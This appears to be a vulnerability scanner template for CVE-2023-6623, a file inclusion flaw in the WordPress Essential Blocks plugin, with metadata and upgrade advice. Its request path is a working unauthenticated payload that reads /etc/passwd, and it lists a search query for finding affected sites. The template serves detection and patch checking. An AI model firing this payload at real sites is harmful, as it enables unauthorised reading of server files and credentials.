http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - regex('root:.*:0:0:', body_1)
    - "contains(body_2, \"Essential Blocks \u2013 Page\")"
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/index.php?rest_route=%2Fessential-blocks%2Fv1%2Fproducts&is_frontend=true&attributes={"__file":"/etc%2fpasswd"}'
  - '{{BaseURL}}/wp-content/plugins/essential-blocks/readme.txt'
id: CVE-2023-6623
info:
  author: iamnoooob,rootxharsh,pdresearch,coldfish
  classification:
    cpe: cpe:2.3:a:wpdeveloper:essential_blocks:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-6623
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.9444
    epss-score: 0.10258
  description: 'Wordpress Essential Blocks plugin prior to 4.4.3 was discovered to
    be vulnerable to a significant Local File Inclusion vulnerability that may be
    exploited by any attacker, regardless of whether they have an account on the site.

    '
  impact: 'An attacker can exploit this vulnerability to access sensitive information,
    such as configuration files, credentials, or other sensitive data stored on the
    server.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: essential_blocks
    publicwww-query: /wp-content/plugins/essential-blocks/
    vendor: wpdeveloper
    verified: true
  name: Essential Blocks < 4.4.3 - Local File Inclusion
  reference:
  - https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/
  - https://flysec-blog.blogspot.com/2024/01/cve-2023-6623-file-inclusion.html
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-6623
  remediation: 'Upgrade to the latest version of Essential Blocks 4.4.3 to fix this
    issue.

    '
  severity: critical
  tags: wpscan,cve,cve2023,wp,wp-plugin,wordpress,essential-blocks,lfi
